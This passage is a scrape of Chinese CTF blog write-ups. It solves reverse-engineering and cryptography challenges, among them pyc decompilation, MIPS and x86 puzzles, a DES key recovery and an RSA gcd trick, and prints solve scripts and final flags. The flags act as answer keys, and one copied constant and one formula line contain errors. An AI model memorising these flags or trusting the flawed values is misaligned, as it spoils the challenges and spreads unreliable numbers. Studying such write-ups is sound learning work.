打开struct.pyc文件，用该文件的前8字节替换login.pyc的前8字节，替换后的login.pyc文件如下 然后在线反编译pyc文件，得到login.py的代码 python反编译 - 在线工具 (tool.lu) 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python# visit https://tool.lu/pyc/ for more informationimport sysinput1 = input('input something:')if len(input1) != 14: print('Wrong length!') sys.exit()code = []for i in range(13): code.append(ord(input1[i]) ^ ord(input1[i + 1]))code.append(ord(input1[13]))a1 = code[2]a2 = code[1]a3 = code[0]a4 = code[3]a5 = code[4]a6 = code[5]a7 = code[6]a8 = code[7]a9 = code[9]a10 = code[8]a11 = code[10]a12 = code[11]a13 = code[12]a14 = code[13]if ((((a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5) + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36) + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60) + a14 * 29 == 22748) &amp; ((((a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25) + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66) + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39) + a14 * 17 == 7258) &amp; ((((a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65) + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33) + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34) + a14 * 23 == 26190) &amp; ((((a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59) + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32) + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60) + a14 * 29 == 37136) &amp; (((a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52) + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36) + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) &amp; ((((a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45) + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26) + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61) + a14 * 28 == 17298) &amp; ((((a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42) + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47) + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44) + a14 * 65 == 19875) &amp; (((a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85) + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30) + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) &amp; ((((a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85) + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36) + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64) + a14 * 27 == 9710) &amp; (((((a1 * 67 - a2 * 68) + a3 * 68 - a4 * 51 - a5 * 43) + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38) + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52) + a14 * 31 == 13376) &amp; ((((a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51) + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6) + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67) + a14 * 78 == 24065) &amp; ((((a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5) + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35) + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61) + a14 * 20 == 27687) &amp; (((a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25) + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92) + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) &amp; (((a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43) + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36) + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317): print('flag is GWHT{md5(your_input)}') print('Congratulations and have fun!')else: print('Sorry,plz try again...') 然后就是解方程 1234567891011121314151617181920212223242526272829303132from sympy import *import hashliba1=symbols('a1')a2=symbols('a2')a3=symbols('a3')a4=symbols('a4')a5=symbols('a5')a6=symbols('a6')a7=symbols('a7')a8=symbols('a8')a9=symbols('a9')a10=symbols('a10')a11=symbols('a11')a12=symbols('a12')a13=symbols('a13')a14=symbols('a14')print(solve([((((a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5) + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36) + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60) + a14 * 29 - 22748), ((((a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25) + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66) + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39) + a14 * 17 - 7258) ,((((a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65) + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33) + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34) + a14 * 23 - 26190) ,((((a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59) + a5 * 49 + a6 * 81 + a7 * 25 + (a8 * pow(2,7)) - a9 * 32) + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60) + a14 * 29 - 37136) ,(((a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52) + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36) + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 - 27915) ,((((a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45) + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26) + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61) + a14 * 28 - 17298) ,((((a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42) + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47) + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44) + a14 * 65 - 19875) ,(((a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85) + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30) + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 - 22784) ,((((a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85) + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36) + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64) + a14 * 27 - 9710) ,(((((a1 * 67 - a2 * 68) + a3 * 68 - a4 * 51 - a5 * 43) + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38) + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52) + a14 * 31 - 13376) ,((((a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51) + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6) + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67) + a14 * 78 - 24065) ,((((a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5) + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35) + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61) + a14 * 20 - 27687) ,(((a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25) + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92) + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 - 29250) ,(((a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43) + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36) + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 - 15317)],[a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14])) 得到结果：{a1: 119, a2: 24, a3: 10, a4: 7, a5: 104, a6: 43, a7: 28, a8: 91, a9: 52, a10: 108, a11: 88, a12: 74, a13: 88, a14: 33} 由于原输入和$a_i$ 不是一一对应的，需要稍微调整一下，然后在进行一个异或，最后md5一下就出来Flag了 12345678910111213import hashlibinput1=[10,24,119,7,104,43,28,91,108,52,88,74,88,33]for i in range(12,-1,-1): input1[i]^=input1[i+1]print(input1)flag=''for i in input1: flag+=chr(i)print(flag)print(len(flag))h=hashlib.md5()h.update(flag.encode())print(h.hexdigest()) flag{58964088b637e50d3a22b9510c1d1ef8}","link":"/2022/01/28/BUUOJ-Reverse-1/"},{"title":"BUUOJ Reverse 2","text":"[QCTF2018]Xman-babymips拖进ida，进到主函数，程序结构也比较简单 一开始先进行逐字节的异或处理 然后是一个循环移位的操作，然后与off_410D04指向的数组中的值比较一下得到结果 解题思路很简单，直接逆就行了 123456789101112131415def move1(num): return (num&gt;&gt;6)|(num&lt;&lt;2)&amp;0xffdef move2(num): return (num&gt;&gt;2)|(num&lt;&lt;6)&amp;0xffstr='Q|j{g'flag=''for i in range(5): flag+=chr(ord(str[i])^(32-i))t=[0,0,0,0,0,0x52,0xfd,0x16,0xa4,0x89,0xbd,0x92,0x80,0x13,0x41,0x54,0xa0,0x8d,0x45,0x18,0x81,0xde,0xfc,0x95,0xf0,0x16,0x79,0x1a,0x15,0x5b,0x75,0x1f]for i in range(5,32): if i&amp;1==1: flag+=chr(move1(t[i])^(32-i)) else: flag+=chr(move2(t[i])^(32-i))print(flag) qctf{ReA11y_4_B@89_mlp5_4_XmAn_} [SCTF2019]babyre拖进ida 发现一堆汇编代码，不能f5，大概是有花指令 按P声明函数，控制台显示有未定义指令，双击该地址进行去花 依次去了几处后就能反编译出Main函数了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118__int64 __fastcall main(int a1, char **a2, char **a3){ __int64 result; // rax char v4; // [rsp+Fh] [rbp-151h] int v5; // [rsp+10h] [rbp-150h] int v6; // [rsp+14h] [rbp-14Ch] char *v7; // [rsp+18h] [rbp-148h] char v8[10]; // [rsp+26h] [rbp-13Ah] BYREF _QWORD v9[2]; // [rsp+30h] [rbp-130h] BYREF int v10; // [rsp+40h] [rbp-120h] __int64 v11[3]; // [rsp+50h] [rbp-110h] BYREF char v12; // [rsp+68h] [rbp-F8h] __int64 v13[3]; // [rsp+70h] [rbp-F0h] BYREF char v14; // [rsp+88h] [rbp-D8h] __int64 v15[6]; // [rsp+90h] [rbp-D0h] BYREF __int16 v16; // [rsp+C0h] [rbp-A0h] char v17[136]; // [rsp+D0h] [rbp-90h] BYREF unsigned __int64 v18; // [rsp+158h] [rbp-8h] v18 = __readfsqword(0x28u); v5 = 0; v11[0] = 0LL; v11[1] = 0LL; v11[2] = 0LL; v12 = 0; v13[0] = 0LL; v13[1] = 0LL; v13[2] = 0LL; v14 = 0; v15[0] = 0LL; v15[1] = 0LL; v15[2] = 0LL; v15[3] = 0LL; v15[4] = 0LL; v15[5] = 0LL; v16 = 0; strcpy( v17, &quot;**************.****.**s..*..******.****.***********..***..**..#*..***..***.********************.**..*******..**...*..*.*.**.*&quot;); v9[0] = 0LL; v9[1] = 0LL; v10 = 0; v7 = &amp;v17[22]; strcpy(v8, &quot;sctf_9102&quot;); puts((const char *)(unsigned int)&quot;plz tell me the shortest password1:&quot;); scanf(&quot;%s&quot;, v15); v6 = 1; while ( v6 ) { v4 = *((_BYTE *)v15 + v5); switch ( v4 ) { case 'w': v7 -= 5; break; case 's': v7 += 5; break; case 'd': ++v7; break; case 'a': --v7; break; case 'x': v7 += 25; break; case 'y': v7 -= 25; break; default: v6 = 0; break; } ++v5; if ( *v7 != 46 &amp;&amp; *v7 != 35 ) v6 = 0; if ( *v7 == 35 ) { puts(&quot;good!you find the right way!\\nBut there is another challenge!&quot;); break; } } if ( v6 ) { puts((const char *)(unsigned int)&quot;plz tell me the password2:&quot;); scanf(&quot;%s&quot;, v11); ((void (__fastcall *)(__int64 *, __int64 *))loc_C22)(v11, v13); if ( (unsigned int)sub_F67(v13, v8) == 1 ) { puts(&quot;Congratulation!&quot;); puts((const char *)(unsigned int)&quot;Now,this is the last!&quot;); puts(&quot;plz tell me the password3:&quot;); scanf(&quot;%s&quot;, v9); if ( (unsigned int)sub_FFA(v9) == 1 ) { puts(&quot;Congratulation!Here is your flag!:&quot;); printf(&quot;sctf{%s-%s(%s)}&quot;, (const char *)v15, (const char *)v11, (const char *)v9); } else { printf(&quot;something srong...&quot;); } result = 0LL; } else { printf(&quot;sorry,somthing wrong...&quot;); result = 0LL; } } else { printf(&quot;sorry,is't not a right way...&quot;); result = 0LL; } return result;} 观察代码，大概是一个5*25的迷宫题,wasd分别为上下左右，还有xy为向上或向下跳5行，起点位于s处 第一个循环的路大概是sxss 接下来还有Password2，继续分析，进到loc_c22中查看 按p声明函数，控制台发现地址e1c处有未识别的数据： 按c转换为代码 然后在各种标红的地方还有一些奇怪的跳转处nop掉指令，最终成功能f5 然后第二部分是一个base64的解码 password2为c2N0Zl85MTAy 然后进到password3 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990__int64 __fastcall sub_FFA(char *input3){ int v2; // [rsp+18h] [rbp-158h] int i; // [rsp+18h] [rbp-158h] int v4; // [rsp+1Ch] [rbp-154h] int v5; // [rsp+24h] [rbp-14Ch] int v6; // [rsp+28h] [rbp-148h] int v7; // [rsp+2Ch] [rbp-144h] int v8[16]; // [rsp+30h] [rbp-140h] int v9[16]; // [rsp+70h] [rbp-100h] int v10[26]; // [rsp+B0h] [rbp-C0h] unsigned int v11; // [rsp+118h] [rbp-58h] unsigned int v12; // [rsp+11Ch] [rbp-54h] unsigned int v13; // [rsp+120h] [rbp-50h] unsigned int v14; // [rsp+124h] [rbp-4Ch] unsigned __int64 v15; // [rsp+168h] [rbp-8h] v15 = __readfsqword(0x28u); v8[0] = 190; v8[1] = 4; v8[2] = 6; v8[3] = 128; v8[4] = 197; v8[5] = 175; v8[6] = 118; v8[7] = 71; v8[8] = 159; v8[9] = 204; v8[10] = 64; v8[11] = 31; v8[12] = 216; v8[13] = 191; v8[14] = 146; v8[15] = 239; v5 = (input3[6] &lt;&lt; 8) | (input3[5] &lt;&lt; 16) | (input3[4] &lt;&lt; 24) | input3[7]; v6 = (input3[10] &lt;&lt; 8) | (input3[9] &lt;&lt; 16) | (input3[8] &lt;&lt; 24) | input3[11]; v7 = (input3[14] &lt;&lt; 8) | (input3[13] &lt;&lt; 16) | (input3[12] &lt;&lt; 24) | input3[15]; v4 = 0; v2 = 4; v10[0] = sub_78A((input3[2] &lt;&lt; 8) | (input3[1] &lt;&lt; 16) | (*input3 &lt;&lt; 24) | (unsigned int)input3[3]); v10[1] = sub_78A(v5); v10[2] = sub_78A(v6); v10[3] = sub_78A(v7); do { v10[v2] = sub_143B(v10[v4], v10[v4 + 1], v10[v4 + 2], v10[v4 + 3]); ++v4; ++v2; } while ( v2 &lt;= 29 ); v9[0] = HIBYTE(v11); v9[1] = BYTE2(v11); v9[2] = BYTE1(v11); v9[3] = (unsigned __int8)v11; v9[4] = HIBYTE(v12); v9[5] = BYTE2(v12); v9[6] = BYTE1(v12); v9[7] = (unsigned __int8)v12; v9[8] = HIBYTE(v13); v9[9] = BYTE2(v13); v9[10] = BYTE1(v13); v9[11] = (unsigned __int8)v13; v9[12] = HIBYTE(v14); v9[13] = BYTE2(v14); v9[14] = BYTE1(v14); v9[15] = (unsigned __int8)v14; for ( i = 0; i &lt;= 15; ++i ) { if ( v9[i] != v8[i] ) return 0xFFFFFFFFLL; } return 1LL;}__int64 __fastcall sub_143B(int a1, int a2, int a3, unsigned int a4){ return a1 ^ (unsigned int)sub_1464(a2 ^ a3 ^ a4);}__int64 __fastcall sub_1464(unsigned int a1){ int v2; // [rsp+18h] [rbp-498h] int v3[290]; // [rsp+20h] [rbp-490h] BYREF unsigned __int64 v4; // [rsp+4A8h] [rbp-8h] v4 = __readfsqword(0x28u); qmemcpy(v3, &amp;unk_1940, 0x480uLL); v2 = (v3[BYTE2(a1)] &lt;&lt; 16) | v3[(unsigned __int8)a1] | (v3[BYTE1(a1)] &lt;&lt; 8) | (v3[HIBYTE(a1)] &lt;&lt; 24); return __ROL4__(v2, 12) ^ (unsigned int)(__ROL4__(v2, 8) ^ __ROR4__(v2, 2)) ^ __ROR4__(v2, 6);} 对加密算法进行逆向： 1234567891011121314151617181920212223242526272829303132from libnum import n2sf=open('55','rb')table=[]for i in range(68): line=f.read(16) for j in range(len(line)): if j%4==0: table.append(line[j])for i in range(0,len(table),4): print(hex(table[i]),hex(table[i+1]),hex(table[i+2]),hex(table[i+3]))def sub_143b(a1,a2,a3,a4): return a1^sub_1464(a2^a3^a4)def sub_1464(a1): v2=(table[a1&gt;&gt;24]&lt;&lt;24)|(table[(a1&gt;&gt;16)&amp;0xff]&lt;&lt;16)|(table[(a1&gt;&gt;8)&amp;0xff]&lt;&lt;8)|(table[a1&amp;0xff]) return rol(v2,12)^rol(v2,8)^ror(v2,2)^ror(v2,6)def rol(a1,s): return ((a1&lt;&lt;s)|(a1&gt;&gt;(32-s)))&amp;0xffffffffdef ror(a1,s): return ((a1&gt;&gt;s)|(a1&lt;&lt;(32-s)))&amp;0xffffffffa = [0]*26a.append(0xBE040680)a.append(0xC5AF7647)a.append(0x9FCC401F)a.append(0xD8BF92EF)for i in range(25,-1,-1): a[i] = sub_143b(a[i+4],a[i+1],a[i+2],a[i+3])print(n2s(a[0])[::-1]+n2s(a[1])[::-1]+n2s(a[2])[::-1]+n2s(a[3])[::-1]) 最终得到flag:sctf{sxss-c2N0Zl85MTAy(fl4g_is_s0_ug1y!)} [2019红帽杯]Snake（不看dl的wp完全不会系列，就连wp也跟dl一样系列） 下载附件，解压发现是个有Unity写的游戏 找到Assembly-CSharp.dll文件，拖进dnspy，找到游戏主函数GameObject 发现这个函数是在Interface中，就到文件中找Interface.dll，把它拖进ida 找到关键词，点进去，ctrl+s交叉引用定位关键代码 发现一串又臭又长的代码，观察题目的参数a1范围为[0,99]，便进行爆破 123456789101112import ctypesdef fxxk(i): dll = ctypes.cdll.LoadLibrary(&quot;C:\\\\Users\\\\80424\\\\Downloads\\\\attachment\\\\Snake\\\\Snake_Data\\\\Plugins\\\\Interface.dll&quot;) print(i) dll.GameObject(i) if __name__ == '__main__': for i in range(100): fxxk(i) 在漫长的等待后，得到flag:flag{Ch4rp_W1th_R$@}","link":"/2022/02/09/BUUOJ-Reverse-2/"},{"title":"Crypto 2  [NCTF2019]Reverse","text":"[NCTF2019]Reverse核心：如何从DES的单轮子密钥中恢复出原密钥 题目描述： 1234567891011121314import osimport pyDesflag = &quot;NCTF{******************************************}&quot;key = os.urandom(8)d = pyDes.des(key)cipher = d.encrypt(flag.encode())with open('cipher', 'wb') as f: f.write(cipher)# Leak: d.Kn[10] == [0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1] 题目泄露了第十一轮的轮密钥，如图为DES密钥发生器的流程图： 其中置换选择1是将64位密钥通过置换分配给28位的C0和D0，在这个过程中，奇偶校验位被舍去，如图为置换表 置换选择2是将28位的C和D通过置换装配为48位的轮密钥，在这个过程中C的第9、18、22、25和D的7、9、15、26位被舍去，因此需要通过爆破来得到这几个缺失的位置，复杂度为2^8 通过对置换选择1和置换选择2写出逆向函数，期间进行11轮的循环右移，即可得到备选的原密钥，使用这些密钥组来对密文进行解密，最终即可得到flag 解题脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import pyDesfrom Crypto.Util.number import *def recoverKey(subkey): key=[] for iv in range(256): Tmpkey=subkey c0,d0=invert_pc2(Tmpkey,iv) for i in range(10,-1,-1): if(i==1 or i==2 or i==9 or i==16): c0=int2list(moveRight(list2int(c0),1),28) d0=int2list(moveRight(list2int(d0),1),28) else: c0=int2list(moveRight(list2int(c0),2),28) d0=int2list(moveRight(list2int(d0),2),28) # print(c0,c0) key.append(invert_pc1(c0,d0)) return keydef invert_pc2(subkey,iv): table=[ 14,17,11,24,1,5,3,28, 15,6,21,10,23,19,12,4, 26,8,16,7,27,20,13,2, 41,52,31,37,47,55,30,40, 51,45,33,48,44,49,39,56, 34,53,46,42,50,36,29,32] c0=[0]*28 d0=[0]*28 for i in range(24): c0[table[i]-1]=subkey[i] for i in range(24): d0[table[24+i]-29]=subkey[24+i] #c0:9 18 22 25 d0:7 9 15 26 c0[8]=iv&gt;&gt;7 c0[17]=(iv&gt;&gt;6)&amp;1 c0[21]=(iv&gt;&gt;5)&amp;1 c0[24]=(iv&gt;&gt;4)&amp;1 d0[6]=(iv&gt;&gt;3)&amp;1 d0[8]=(iv&gt;&gt;2)&amp;1 d0[14]=(iv&gt;&gt;1)&amp;1 d0[25]=(iv)&amp;1 # print(c0,d0) return c0,d0def invert_pc1(c0,d0): key=[0]*64 table=[[57,49,41,33,25,17,9],[1,58,50,42,34,26,18],[10,2,59,51,43,35,27],[19,11,3,60,52,44,36]] for i in range(4): for j in range(7): key[table[i][j]-1]=c0[7*i+j] table=[[63,55,47,39,31,23,15],[7,62,54,46,38,30,22],[14,6,61,53,45,37,29],[21,13,5,28,20,12,4]] for i in range(4): for j in range(7): key[table[i][j]-1]=d0[7*i+j] return keydef moveRight(a,b): return (a&gt;&gt;b)|(a&lt;&lt;(28-b)&amp;0xfffffff)def list2int(li): a=0 for i in range(len(li)): a&lt;&lt;=1 a|=li[i] return adef int2list(v,length): li=[] for i in range(length): li.append(v&amp;1) v&gt;&gt;=1 return li[::-1]leakKey_10=[0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1]key=recoverKey(leakKey_10)f=open('cipher','rb+')cipher=f.read()for i in range(256): tmpKey=long_to_bytes(list2int(key[i])) d = pyDes.des(tmpKey) flag = d.decrypt(cipher) print(flag)# NCTF{1t_7urn3d_0u7_7h47_u_2_g00d_@_r3v3rs3_1snt}","link":"/2022/03/12/Crypto-2-NCTF2019-Reverse/"},{"title":"Crypto 1","text":"[GKCTF 2021]RRRRsa下载附件，得到task.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from Crypto.Util.number import *from gmpy2 import gcdflag = b'xxxxxxxxxxxxx'p = getPrime(512)q = getPrime(512)m = bytes_to_long(flag)n = p*qe = 65537c = pow(m,e,n)print('c={}'.format(c))p1 = getPrime(512)q1 = getPrime(512)n1 = p1*q1e1 = 65537assert gcd(e1,(p1-1)*(q1-1)) == 1c1 = pow(p,e1,n1)print('n1={}'.format(n1))print('c1={}'.format(c1))hint1 = pow(2020 * p1 + q1, 202020, n1)hint2 = pow(2021 * p1 + 212121, q1, n1)print('hint1={}'.format(hint1))print('hint2={}'.format(hint2))p2 = getPrime(512)q2 = getPrime(512)n2 = p2*q2e2 = 65537assert gcd(e1,(p2-1)*(q2-1)) == 1c2 = pow(q,e2,n2)hint3 = pow(2020 * p2 + 2021 * q2, 202020, n2)hint4 = pow(2021 * p2 + 2020 * q2, 212121, n2)print('n2={}'.format(n2))print('c2={}'.format(c2))print('hint3={}'.format(hint3))print('hint4={}'.format(hint4))#c=13492392717469817866883431475453770951837476241371989714683737558395769731416522300851917887957945766132864151382877462142018129852703437240533684604508379950293643294877725773675505912622208813435625177696614781601216465807569201380151669942605208425645258372134465547452376467465833013387018542999562042758#n1=75003557379080252219517825998990183226659117019770735080523409561757225883651040882547519748107588719498261922816865626714101556207649929655822889945870341168644508079317582220034374613066751916750036253423990673764234066999306874078424803774652754587494762629397701664706287999727238636073466137405374927829#c1=68111901092027813007099627893896838517426971082877204047110404787823279211508183783468891474661365139933325981191524511345219830693064573462115529345012970089065201176142417462299650761299758078141504126185921304526414911455395289228444974516503526507906721378965227166653195076209418852399008741560796631569#hint1=23552090716381769484990784116875558895715552896983313406764042416318710076256166472426553520240265023978449945974218435787929202289208329156594838420190890104226497263852461928474756025539394996288951828172126419569993301524866753797584032740426259804002564701319538183190684075289055345581960776903740881951#hint2=52723229698530767897979433914470831153268827008372307239630387100752226850798023362444499211944996778363894528759290565718266340188582253307004810850030833752132728256929572703630431232622151200855160886614350000115704689605102500273815157636476901150408355565958834764444192860513855376978491299658773170270#n2=114535923043375970380117920548097404729043079895540320742847840364455024050473125998926311644172960176471193602850427607899191810616953021324742137492746159921284982146320175356395325890407704697018412456350862990849606200323084717352630282539156670636025924425865741196506478163922312894384285889848355244489#c2=67054203666901691181215262587447180910225473339143260100831118313521471029889304176235434129632237116993910316978096018724911531011857469325115308802162172965564951703583450817489247675458024801774590728726471567407812572210421642171456850352167810755440990035255967091145950569246426544351461548548423025004#hint3=25590923416756813543880554963887576960707333607377889401033718419301278802157204881039116350321872162118977797069089653428121479486603744700519830597186045931412652681572060953439655868476311798368015878628002547540835719870081007505735499581449077950263721606955524302365518362434928190394924399683131242077#hint4=104100726926923869566862741238876132366916970864374562947844669556403268955625670105641264367038885706425427864941392601593437305258297198111819227915453081797889565662276003122901139755153002219126366611021736066016741562232998047253335141676203376521742965365133597943669838076210444485458296240951668402513 可见看见思路大概是分别通过hint1和hint2、hint3和hint4解出p、q，从而得到flag 而这个过程的主要思路是通过构建关系是消去$p_i$或者$q_i$，利用GCD得到$p_i$或者$q_i$ 利用hint1和hint2解出p题目中hint1和hint2大概满足这个关系： hint_1=(2020*p1+q1)^{202020}\\ mod\\ n_1 \\\\ hint_2=(2021*p_1+212121)^{q_1}\\ mod\\ n_1利用费马小定理，可以得到： hint_2=2021*p_1+212121\\ mod\\ q_1即： hint_2=2021*p_1+212121+k*q_1同时由二项式定理： hint_1=(2020*p_1)^{202020}+q_1^{202020}\\ mod\\ n_1\\由两式构造公因子： (hint_2-212121)^{202020}=(2021*p_1)^{202020}+(k*q_1)^{202020} \\\\ 2020^{202020}*(hint_2-212121)^{202020}-2021^{202020}*hint_1\\\\ =(2020*2021*p_1)^{202020}+(k_1*q_1)^{202020}-(2020*2021*p_1)^{202020}-(k_2*q_1)^{202020}\\\\ =(k_1*q_1)^{202020}-(k_2*q_1)^{202020}\\\\ =q_1(k_1^{202020}*q_1{202019}-k_2^{202020}*q_1^{202019})\\\\ =q_1*k_3然后通过求与n1的最大公因数，即可获得q1，从而求解出p的值 利用Hint3和Hint4求q的值题中关系： hint_3=(2020*p_2+2021*q_2)^{202020}\\ mod\\ n_2\\\\ hint_4=(2021*p_2+2020*q_2)^{212121}\\ mod\\ n_2将两式转换为同指数： hint_3^{212121}=(2020*p_2+2021*q_2)^{202020*212121}\\ mod\\ n_2\\\\ hint_4^{202020}=(2021*p_2+2020*q_2)^{202020*212121}\\ mod\\ n_2由二项式定理： hint_3^{212121}=(2020*p_2)^{202020*212121}+(2021*q_2)^{202020*212121}\\ mod\\ n_2\\\\ hint_4^{202020}=(2021*p_2)^{202020*212121}+(2020*q_2)^{202020*212121}\\ mod\\ n_2将其中一个未知量转化为同系数，相减 (2021)^{202020*212121}hint_3^{212121}-(2020)^{202020*212121}hint_4^{202020}\\\\ =(2020*2021*p_2)^{202020*212121}+(212121*212121*q_2)^{202020*212121}-(2020*2021*p_2)^{202020*212121}-(2020*2020*q_2)^{202020*212121}\\\\ =(212121*212121*q_2)^{202020*212121}-(2020*2020*q_2)^{202020*212121}\\ mod\\ n_2令上式结果与n2求最大公因数，即得q2，从而可以得到q的值 解题脚本：12345678910111213141516171819202122232425262728293031323334353637from Crypto.Util.number import *from libnum import n2sc=13492392717469817866883431475453770951837476241371989714683737558395769731416522300851917887957945766132864151382877462142018129852703437240533684604508379950293643294877725773675505912622208813435625177696614781601216465807569201380151669942605208425645258372134465547452376467465833013387018542999562042758n1=75003557379080252219517825998990183226659117019770735080523409561757225883651040882547519748107588719498261922816865626714101556207649929655822889945870341168644508079317582220034374613066751916750036253423990673764234066999306874078424803774652754587494762629397701664706287999727238636073466137405374927829c1=68111901092027813007099627893896838517426971082877204047110404787823279211508183783468891474661365139933325981191524511345219830693064573462115529345012970089065201176142417462299650761299758078141504126185921304526414911455395289228444974516503526507906721378965227166653195076209418852399008741560796631569hint1=23552090716381769484990784116875558895715552896983313406764042416318710076256166472426553520240265023978449945974218435787929202289208329156594838420190890104226497263852461928474756025539394996288951828172126419569993301524866753797584032740426259804002564701319538183190684075289055345581960776903740881951hint2=527232296985307678979794339144708311532688127008372307239630387100752226850798023362444499211944996778363894528759290565718266340188582253307004810850030833752132728256929572703630431232622151200855160886614350000115704689605102500273815157636476901150408355565958834764444192860513855376978491299658773170270n2=114535923043375970380117920548097404729043079895540320742847840364455024050473125998926311644172960176471193602850427607899191810616953021324742137492746159921284982146320175356395325890407704697018412456350862990849606200323084717352630282539156670636025924425865741196506478163922312894384285889848355244489c2=67054203666901691181215262587447180910225473339143260100831118313521471029889304176235434129632237116993910316978096018724911531011857469325115308802162172965564951703583450817489247675458024801774590728726471567407812572210421642171456850352167810755440990035255967091145950569246426544351461548548423025004hint3=25590923416756813543880554963887576960707333607377889401033718419301278802157204881039116350321872162118977797069089653428121479486603744700519830597186045931412652681572060953439655868476311798368015878628002547540835719870081007505735499581449077950263721606955524302365518362434928190394924399683131242077hint4=10410072692692386956686274123887613236691697086437456294784466955640326895562567010564126436703888570642542786494139260